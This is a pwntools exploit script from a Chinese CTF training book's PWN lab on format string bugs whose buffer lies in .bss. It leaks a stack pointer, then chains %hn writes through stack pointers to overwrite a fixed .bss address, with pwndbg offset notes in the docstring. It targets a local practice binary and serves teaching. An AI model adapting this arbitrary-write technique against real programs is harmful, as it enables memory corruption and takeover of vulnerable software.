"""
格式化字符串不在栈上的利用方式
从0到1：CTFer成长之路-PWN篇_实验 13.zip
参数在 .bss 段
|0a:0050│  0x7ffe9b362c80 —▸ 0x4005d0 (_start) ◂— xor ebp, ebp
│13:0098│  0x7ffe9b362cc8 —▸ 0x7ffe9b362d38 —▸ 0x7ffe9b362c82 ◂— 0x2d20000000000040 /* '@'
│13:0098│  a              —▸    b           —▸ c ◂— 0x2d20000000000040 /* '@'
│pwndbg> fmtarg 0x7ffe9b362cc8
│The index of format argument : 25 ("\%24$p")
pwndbg> fmtarg 0x7ffe9b362c80
The index of format argument : 16 ("\%15$p")
pwndbg> fmtarg 0x7ffe9b362d38
The index of format argument : 39 ("\%38$p")
0x7ffe9b362d38 - 0x7ffe9b362c80 = 0xb8
"""
from pwn import *

s = process('demo')
value = 0xDEADBEEF12345678

payload = "%25$p"
# offset 25
# offset 16
# offset 39

# gdb.attach(s, "b *0x4006e5\n\c\n")
# gdb.attach(s, "b *0x04006FE\n\c\n")
s.sendline(payload)
stack = int(s.recv(14), 16)
success(hex(stack))

pie = stack - 0xb8
pie += 2
print('pie ', hex(pie))
payload = "%" + str(pie & 0xffff) + "c%25$hn" # c处改为 0x7ffe9b362c80
print('payload, ', payload)
s.sendline(payload)

secret1 = 0x601080 # .bss段中固定地址
secret2 = secret1 // 0x10000
payload = "%" + str(secret2 & 0xffff) + "c%39$hn" # 0x60写入
s.sendline(payload)

pie -= 2
payload = "%" + str(pie & 0xffff) + "c%25$hn"
s.sendline(payload)

for i in range(4):
    payload = "%" + str(secret1 & 0xffff) + "c%39$hn"
    s.sendline(payload)
    payload = "%" + str(value & 0xffff) + "c%16$hn"
    s.sendline(payload)
    secret1 += 2
    value //= 0x10000

s.sendline('bye')
s.interactive()
